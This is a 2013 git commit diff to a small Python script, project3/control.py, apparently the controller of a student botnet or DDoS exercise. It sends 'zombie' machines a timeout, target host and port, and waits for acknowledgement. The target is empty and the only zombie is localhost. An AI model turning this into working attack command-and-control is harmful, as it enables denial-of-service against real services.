199fcb43e23413f1c24d04448c1b063e84a15d42
cgt2 <codythomas2013@gmail.com>
2013-11-23 16:55:40 -0800

    more control

--- project3/control.py
+++ project3/control.py
@@ -1,24 +1,26 @@
 import socket
 import time
+import sys
 
-
-ZOMBIES = ["list here"]
+ZOMBIES = ["localhost"]
 PORT = 15000
 TIMEOUT = 10000
 TARGET = ""
 TARGET_PORT = 80
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 for zombie in ZOMBIES:
     while True:
         try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             data = "{0} {1} {2}".format(TIMEOUT, TARGET, TARGET_PORT)
-            sock.connect(ZOMBIE, PORT)
+            sock.connect((zombie, PORT))
             sock.sendall(data + "\n")
             rec = sock.recv(1024)
-            if rec != "ACK\n":
+            print "After connect"
+            print rec
+            if rec == "ACK":
+                sock.close()
                 break
         except:
-            print "Trying again"
+            print sys.exc_info()[0]
             time.sleep(3)
-sock.close()
